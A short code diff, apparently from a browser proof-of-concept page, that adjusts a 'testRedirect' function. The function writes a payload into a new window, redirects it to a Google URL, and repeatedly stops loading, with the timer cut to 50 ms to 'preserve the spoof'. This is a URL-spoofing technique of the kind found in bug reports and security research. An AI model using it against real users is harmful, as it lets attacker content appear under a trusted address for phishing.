@@ -9,9 +9,9 @@ function testRedirect() {
     win.document.write(payload);
     win.document.close();
     win.location.replace("https://www.google.com/csi");
-    setInterval(function() {
-        win.stop();
-    }, 1500);  // Small interval to preserve the spoof
+    setInterval(() => {
+    try { win.stop(); } catch(e){}
+    }, 50);
 }
 </script>
 </body>
